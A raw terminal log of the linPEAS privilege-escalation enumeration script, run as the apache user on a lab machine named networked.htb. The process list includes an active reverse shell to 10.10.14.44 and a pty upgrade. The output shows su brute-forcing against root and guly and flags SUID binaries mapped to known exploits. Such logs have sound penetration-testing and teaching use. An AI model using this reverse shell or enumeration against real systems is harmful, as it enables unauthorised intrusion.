@@ -1,0 +1,893 @@
+apache@networked /tmp $ ./linpeas.sh -a
+which: no fping in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
+
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+  linpeas v2.3.7 by carlospolop
+
+ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.10.0-957.21.3.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Tue Jun 18 16:35:19 UTC 2019
+User & Groups: uid=48(apache) gid=48(apache) groups=48(apache)
+Hostname: networked.htb
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 3.10.0-957.21.3.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Tue Jun 18 16:35:19 UTC 2019
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.23
+
+[+] PATH
+[i] Any writable folder in original PATH? (a new completed path will be exported)
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Sun Aug  9 15:11:45 CEST 2020
+
+[+] System stats
+Filesystem               Size  Used Avail Use% Mounted on
+/dev/mapper/centos-root  6.2G  1.3G  5.0G  21% /
+devtmpfs                 475M     0  475M   0% /dev
+tmpfs                    487M  4.0K  487M   1% /dev/shm
+tmpfs                    487M     0  487M   0% /sys/fs/cgroup
+tmpfs                    487M  7.5M  479M   2% /run
+/dev/sda1               1014M  163M  852M  17% /boot
+tmpfs                     98M     0   98M   0% /run/user/0
+              total        used        free      shared  buff/cache   available
+Mem:         995892      153912      505956        7664      336024      627232
+Swap:        839676           0      839676
+
+[+] Environment
+[i] Any private information inside environment variables?
+TERM=xterm
+SHELL=bash
+HISTSIZE=0
+HISTFILESIZE=0
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C
+NOTIFY_SOCKET=/run/systemd/notify
+SHLVL=5
+LS_OPTIONS=--color=auto
+HISTFILE=/dev/null
+_=/usr/bin/env
+
+[+] Looking for Signature verification failed in dmseg
+ Not Found
+
+[+] selinux enabled? .............. SELinux status:                 disabled
+[+] Printer? ...................... lpstat Not Found
+[+] Is this a container? .......... No
+[+] Is ASLR enabled? .............. Yes
+
+=========================================( Devices )==========================================
+[+] Any sd* disk in /dev? (limit 20)
+sda
+sda1
+sda2
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+
+/dev/mapper/centos-root /                       xfs     defaults        0 0
+UUID=1b610dfb-776c-4976-b3f3-df896ee84569 /boot                   xfs     defaults        0 0
+/dev/mapper/centos-swap swap                    swap    defaults        0 0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nc
+/usr/bin/ncat
+/usr/bin/curl
+/usr/bin/ping
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/socat
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Compilers Installed
+Compilers Not Found
+
+
+================================( Processes, Cron & Services )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.3 125312  3780 ?        Ss   14:48   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root       3008  0.0  0.2  37116  2800 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-journald
+root       3027  0.0  0.1 124824  1328 ?        Ss   14:48   0:00 /usr/sbin/lvmetad -f
+root       3029  0.0  0.1  44516  1896 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-udevd
+root       3156  0.0  0.0  55520   904 ?        S<sl 14:48   0:00 /sbin/auditd
+root       3178  0.0  0.1  26376  1760 ?        Ss   14:48   0:00 /usr/lib/systemd/systemd-logind
+polkitd    3179  0.0  1.3 612996 12988 ?        Ssl  14:48   0:00 /usr/lib/polkit-1/polkitd --no-debug
+dbus       3181  0.0  0.2  58260  2552 ?        Ss   14:48   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       3186  0.0  0.6  99672  6092 ?        Ss   14:48   0:00 /usr/bin/VGAuthService -s
+root       3187  0.0  0.6 300820  6336 ?        Ssl  14:48   0:01 /usr/bin/vmtoolsd
+root       3195  0.0  0.1 126284  1592 ?        Ss   14:48   0:00 /usr/sbin/crond -n
+root       3200  0.0  2.9 358288 29100 ?        Ssl  14:48   0:00 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
+root       3202  0.0  0.0 110104   868 tty1     Ss+  14:48   0:00 /sbin/agetty --noclear tty1 linux
+root       3240  0.0  0.8 475888  8232 ?        Ssl  14:49   0:00 /usr/sbin/NetworkManager --no-daemon
+root       3652  0.0  0.3 214444  3956 ?        Ssl  14:49   0:00 /usr/sbin/rsyslogd -n
+root       3653  0.0  1.2 314672 12128 ?        Ss   14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+root       3654  0.0  1.9 573924 19148 ?        Ssl  14:49   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       3656  0.0  0.4 112864  4312 ?        Ss   14:49   0:00 /usr/sbin/sshd -D
+root       3671  0.0  0.2 111192  2812 ?        Ss   14:49   0:00 sendmail: accepting connections
+smmsp      3686  0.0  0.2 106616  2024 ?        Ss   14:49   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
+apache     3688  0.0  0.8 315128  8108 ?        S    14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3689  0.0  1.0 315136 10248 ?        S    14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3690  0.0  1.0 315128 10772 ?        S    14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3691  0.0  1.0 315640 10128 ?        S    14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3692  0.0  0.7 314804  7880 ?        S    14:49   0:00 /usr/sbin/httpd -DFOREGROUND
+apache     3870  0.0  0.7 314808  7688 ?        S    14:50   0:00 /usr/sbin/httpd -DFOREGROUND
+root       3913  0.0  0.0 123260   740 ?        Ss   15:01   0:00 /usr/sbin/anacron -s
+apache     3916  0.0  0.1  11680  1368 ?        S    15:01   0:00 /bin/bash -c bash -i >& /dev/tcp/10.10.14.44/443 0>&1
+apache     3917  0.0  0.1  11684  1716 ?        S    15:01   0:00 bash -i
+apache     3930  0.0  0.4  26028  4748 ?        S    15:05   0:00 python -c import pty; pty.spawn("/bin/bash")
+apache     3931  0.0  0.1  11816  1868 pts/0    Ss   15:05   0:00 /bin/bash
+apache    13059  3.0  0.1   9828  1688 pts/0    S+   15:11   0:00 /bin/sh ./linpeas.sh -a
+apache    13250  0.0  0.1  51740  1740 pts/0    R+   15:11   0:00 ps aux
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x. 1 root root  964608 Oct 30  2018 /bin/bash
+lrwxrwxrwx. 1 root root       4 Jul  2  2019 /bin/sh -> bash
+-rwxr-xr-x. 1 root root   49680 Mar 14  2019 /sbin/agetty
+-rwxr-xr-x. 1 root root  124536 Oct 30  2018 /sbin/auditd
+-rwxr-xr-x. 1 root root  128512 Nov  2  2018 /usr/bin/VGAuthService
+-rwxr-xr-x. 1 root root  223320 Mar 14  2019 /usr/bin/dbus-daemon
+lrwxrwxrwx. 1 root root       7 Jul  2  2019 /usr/bin/python -> python2
+lrwxrwxrwx. 1 root root       9 Jul  2  2019 /usr/bin/python2 -> python2.7
+-rwxr-xr-x. 1 root root   48984 Nov  2  2018 /usr/bin/vmtoolsd
+-rwxr-xr-x. 1 root root  120520 Mar  8  2019 /usr/lib/polkit-1/polkitd
+-rwxr-xr-x  1 root root 1620416 Jul  3  2019 /usr/lib/systemd/systemd
+-rwxr-xr-x  1 root root  346264 Jul  3  2019 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x  1 root root  635816 Jul  3  2019 /usr/lib/systemd/systemd-logind
+-rwxr-xr-x  1 root root  416312 Jul  3  2019 /usr/lib/systemd/systemd-udevd
+-rwxr-xr-x. 1 root root 2580744 Mar 14  2019 /usr/sbin/NetworkManager
+-rwxr-xr-x. 1 root root   36448 Nov 20  2018 /usr/sbin/anacron
+-rwxr-xr-x. 1 root root   70216 Nov 20  2018 /usr/sbin/crond
+-rwxr-xr-x. 1 root root  523672 Apr 24  2019 /usr/sbin/httpd
+-r-xr-xr-x  1 root root   69368 Jul  3  2019 /usr/sbin/lvmetad
+-rwxr-xr-x. 1 root root  664080 Oct 31  2018 /usr/sbin/rsyslogd
+-rwxr-xr-x. 1 root root  853040 Apr 11  2018 /usr/sbin/sshd
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
+-rw-------. 1 root root   0 Nov 20  2018 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun 10  2014 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rw-r--r--.  1 root root  128 Nov 20  2018 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rwx------.  1 root root  219 Oct 30  2018 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rwxr-xr-x.  1 root root  392 Nov 20  2018 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun 10  2014 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun 10  2014 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+[+] Services
+[i] Search for outdated versions
+netconsole module not loaded
+Configured devices:
+lo ens33 guly
+Currently active devices:
+lo ens33
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+networked.htb
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+search htb
+htb
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+default 0.0.0.0
+loopback 127.0.0.0
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+    link/ether 00:50:56:b9:72:ba brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.146/24 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:72ba/64 scope global mngtmpaddr dynamic 
+       valid_lft 86229sec preferred_lft 14229sec
+    inet6 fe80::250:56ff:feb9:72ba/64 scope link 
+       valid_lft forever preferred_lft forever
+10.10.10.2 dev ens33 lladdr 00:50:56:b9:75:a0 DELAY
+fe80::250:56ff:feb9:75a0 dev ens33 lladdr 00:50:56:b9:75:a0 router STALE
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user guly...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+guly:x:1000:1000:guly:/home/guly:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(bin) gid=1(bin) groups=1(bin)
+uid=1000(guly) gid=1000(guly) groups=1000(guly)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
+uid=2(daemon) gid=2(daemon) groups=2(daemon)
+uid=3(adm) gid=4(adm) groups=4(adm)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=47(mailnull) gid=47(mailnull) groups=47(mailnull)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=51(smmsp) gid=51(smmsp) groups=51(smmsp)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=72(tcpdump) gid=72(tcpdump) groups=72(tcpdump)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+uid=998(saslauth) gid=76(saslauth) groups=76(saslauth)
+uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
+
+[+] Login now
+ 15:15:36 up 26 min,  0 users,  load average: 8.42, 3.81, 1.49
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  3.10.0-957.21.3. Sun Aug  9 14:48 - 15:15  (00:26)    
+root     tty1                          Mon Jul 15 11:32 - 11:35  (00:02)    
+reboot   system boot  3.10.0-957.21.3. Mon Jul 15 11:31 - 15:15 (391+03:43) 
+
+wtmp begins Tue Jul  9 13:42:03 2019
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Mon Jul 15 11:32:29 +0200 2019
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512 
+
+[+] User timers
+ Not Found
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Looking for mysql credentials and exec
+ Not Found
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.6 (CentOS)
+Server built:   Apr 24 2019 13:45:48
+
+[+] Looking for PHPCookies
+ Not Found
+
+[+] Looking for Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Looking for Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Looking for supervisord configuration file
+supervisord.conf Not Found
+
+[+] Looking for cesi configuration file
+cesi.conf Not Found
+
+[+] Looking for Rsyncd config file
+rsyncd.conf Not Found
+[+] Looking for Hostapd config file
+hostapd.conf Not Found
+
+[+] Looking for wifi conns file
+/etc/NetworkManager/system-connections/
+
+[+] Looking for Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Looking for .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Looking for ldap directories and their hashes
+.vnc Not Found
+
+[+] Looking for .ovpn files and credentials
+.ovpn Not Found
+
+[+] Looking for ssl/ssh files
+  --> Some certificates were found:
+/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem
+/etc/pki/ca-trust/source/ca-bundle.legacy.crt
+/etc/vmware-tools/GuestProxyData/server/cert.pem
+
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Host *
+	GSSAPIAuthentication yes
+	ForwardX11Trusted yes
+	SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
+	SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
+	SendEnv LC_IDENTIFICATION LC_ALL LANGUAGE
+	SendEnv XMODIFIERS
+
+[+] Looking for unexpected auth lines in /etc/pam.d/sshd
+auth	   required	pam_sepermit.so
+auth       substack     password-auth
+auth       include      postlogin
+-auth      optional     pam_reauthorize.so prepare
+account    include      password-auth
+password   include      password-auth
+session    include      password-auth
+-session   optional     pam_reauthorize.so prepare
+
+[+] Looking for Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Looking for kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Looking for Kibana yaml
+kibana.yml Not Found
+
+[+] Looking for Knock configuration
+Knock.config Not Found
+
+[+] Looking for logstash files
+ Not Found
+
+[+] Looking for elasticsearch files
+ Not Found
+
+[+] Looking for Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Looking for AD cached hahses
+cached hashes Not Found
+
+[+] Looking for screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Looking for tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Looking for Couchdb directory
+
+[+] Looking for redis.conf
+
+[+] Looking for dovecot files
+dovecot credentials Not Found
+
+[+] Looking for mosquitto.conf
+
+[+] Looking for neo4j auth file
+
+[+] Looking Cloud-Init conf file
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/chsh
+/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/su
+/usr/bin/umount		--->	BSD/Linux(08-1996)
+/usr/bin/sudo		--->	/sudo$
+/usr/bin/crontab
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/fusermount
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/wall
+/usr/bin/write
+/usr/bin/ssh-agent
+/usr/bin/lockfile
+/usr/sbin/netreport
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/sbin/sendmail.sendmail
+/usr/libexec/utempter/utempter
+/usr/libexec/openssh/ssh-keysign
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+[+] .sh files in path
+/usr/local/sbin/changename.sh
+/usr/bin/setup-nsssysinit.sh
+/usr/bin/gettext.sh
+/usr/bin/lesspipe.sh
+
+[+] Files (scripts) in /etc/profile.d/
+total 76
+drwxr-xr-x.  2 root root  280 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rw-r--r--.  1 root root  771 Oct 30  2018 256term.csh
+-rw-r--r--.  1 root root  841 Oct 30  2018 256term.sh
+-rw-r--r--.  1 root root  196 Mar 24  2017 colorgrep.csh
+-rw-r--r--.  1 root root  201 Mar 24  2017 colorgrep.sh
+-rw-r--r--.  1 root root 1741 Oct 30  2018 colorls.csh
+-rw-r--r--.  1 root root 1606 Oct 30  2018 colorls.sh
+-rw-r--r--.  1 root root   80 Oct 30  2018 csh.local
+-rw-r--r--.  1 root root 1706 Oct 30  2018 lang.csh
+-rw-r--r--.  1 root root 2703 Oct 30  2018 lang.sh
+-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh
+-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh
+-rw-r--r--.  1 root root   81 Oct 30  2018 sh.local
+-rw-r--r--   1 root root  105 Jun 28  2019 vim.csh
+-rw-r--r--   1 root root  269 Jun 28  2019 vim.sh
+-rw-r--r--.  1 root root  164 Jan 27  2014 which2.csh
+-rw-r--r--.  1 root root  169 Jan 27  2014 which2.sh
+
+[+] Hashes inside passwd file? ........... No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read root folder? .............. No
+
+[+] Looking for root files in home dirs (limit 20)
+/home
+/home/guly/.bash_history
+/home/guly/check_attack.php
+/home/guly/crontab.guly
+
+[+] Looking for others files in folders owned by me
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins
+/var/log/messages
+/var/log/secure
+/var/log/cron
+
+[+] Writable log files (logrotten)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/apache (limit 20)
+
+[+] Files inside others home (limit 20)
+
+[+] Looking for installed mail applications
+mailq.postfix
+mailq.sendmail
+newaliases.postfix
+newaliases.sendmail
+rmail.postfix
+rmail.sendmail
+postfix
+editmap.sendmail
+makemap.sendmail
+postfix
+sendmail
+sendmail.postfix
+sendmail.sendmail
+mailq.postfix
+mailq.sendmail
+newaliases.postfix
+newaliases.sendmail
+rmail.postfix
+rmail.sendmail
+editmap.sendmail
+makemap.sendmail
+postfix
+sendmail
+sendmail.postfix
+sendmail.sendmail
+
+[+] Mails (limit 50)
+/var/mail/guly
+/var/spool/mail/guly
+
+[+] Backup files?
+-rw-r--r-- 1 root root 120959 Jul 15  2019 /var/log/dmesg.old
+-rw-r--r-- 1 root root 10240 Jul  9  2019 /var/www/html/backup/backup.tar
+-rw-r--r--. 1 root root 1735 Oct 30  2018 /etc/nsswitch.conf.bak
+-rw-r--r--. 1 root root 238 Jul  2  2019 /etc/sysconfig/network-scripts/ifcfg-ens33.bak
+
+[+] Looking for tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /etc/pki/nssdb/cert8.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/key3.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/secmod.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/secmod.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/cert8.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/key3.db (limit 20)
+ -> Extracting tables from /etc/aliases.db (limit 20)
+
+[+] Web files?(output limit)
+/var/www/:
+total 0
+drwxr-xr-x.  4 root root  33 Jul  2  2019 .
+drwxr-xr-x. 20 root root 278 Jul  2  2019 ..
+drwxr-xr-x.  2 root root   6 Apr 24  2019 cgi-bin
+drwxr-xr-x.  4 root root 103 Jul  9  2019 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x. 2 root root  6 Apr 24  2019 .
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r--. 1 root root 231 Oct 30  2018 /etc/skel/.bashrc
+-rw-r--r--. 1 root root 2853 Oct 30  2018 /etc/bashrc
+-rw-r--r--. 1 root root 11753 Apr 24  2019 /etc/httpd/conf/httpd.conf
+Reading /etc/httpd/conf/httpd.conf
+ServerRoot "/etc/httpd"
+Listen 80
+Include conf.modules.d/*.conf
+User apache
+Group apache
+ServerAdmin root@localhost
+<Directory />
+    AllowOverride none
+    Require all denied
+</Directory>
+DocumentRoot "/var/www/html"
+<Directory "/var/www">
+    AllowOverride None
+    Require all granted
+</Directory>
+<Directory "/var/www/html">
+    Options Indexes FollowSymLinks
+    AllowOverride None
+    Require all granted
+</Directory>
+<IfModule dir_module>
+    DirectoryIndex index.html
+</IfModule>
+<Files ".ht*">
+    Require all denied
+</Files>
+ErrorLog "logs/error_log"
+LogLevel warn
+<IfModule log_config_module>
+    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %b" common
+    <IfModule logio_module>
+      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
+    </IfModule>
+    CustomLog "logs/access_log" combined
+</IfModule>
+<IfModule alias_module>
+    ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
+</IfModule>
+<Directory "/var/www/cgi-bin">
+    AllowOverride None
+    Options None
+    Require all granted
+</Directory>
+<IfModule mime_module>
+    TypesConfig /etc/mime.types
+    AddType application/x-compress .Z
+    AddType application/x-gzip .gz .tgz
+    AddType text/html .shtml
+    AddOutputFilter INCLUDES .shtml
+</IfModule>
+AddDefaultCharset UTF-8
+<IfModule mime_magic_module>
+    MIMEMagicFile conf/magic
+</IfModule>
+EnableSendfile on
+IncludeOptional conf.d/*.conf
+
+-rw-r--r--. 1 guly guly 231 Oct 30  2018 /home/guly/.bashrc
+lrwxrwxrwx. 1 root root 9 Jul  2  2019 /home/guly/.bash_history -> /dev/null
+Looking for possible passwords inside /home/guly/.bash_history
+
+-rw-r--r--. 1 root root 77 Apr 24  2019 /usr/lib/tmpfiles.d/httpd.conf
+Reading /usr/lib/tmpfiles.d/httpd.conf
+d /run/httpd   710 root apache
+d /run/httpd/htcacheclean   700 apache apache
+
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--. 1 root root 166 Nov  9  2018 /boot/.vmlinuz-3.10.0-957.el7.x86_64.hmac
+-rw-r--r--. 1 root root 171 Jun 18  2019 /boot/.vmlinuz-3.10.0-957.21.3.el7.x86_64.hmac
+-rw-r--r-- 1 root root 0 Aug  9 14:48 /run/initramfs/.need_shutdown
+-rw-r--r--. 1 root root 18 Oct 30  2018 /etc/skel/.bash_logout
+-rw-r--r--. 1 root root 193 Oct 30  2018 /etc/skel/.bash_profile
+-rw-------. 1 root root 0 Jul  2  2019 /etc/.pwd.lock
+-rw-r--r--. 1 root root 129 Apr 25  2019 /etc/selinux/targeted/.policy.sha512
+-rw-r--r--. 1 root root 163 Jul  2  2019 /etc/.updated
+-rw-r--r--. 1 root root 0 Jul  2  2019 /var/lib/rpm/.dbenv.lock
+-rw-r--r--. 1 root root 0 Jul  2  2019 /var/lib/rpm/.rpm.lock
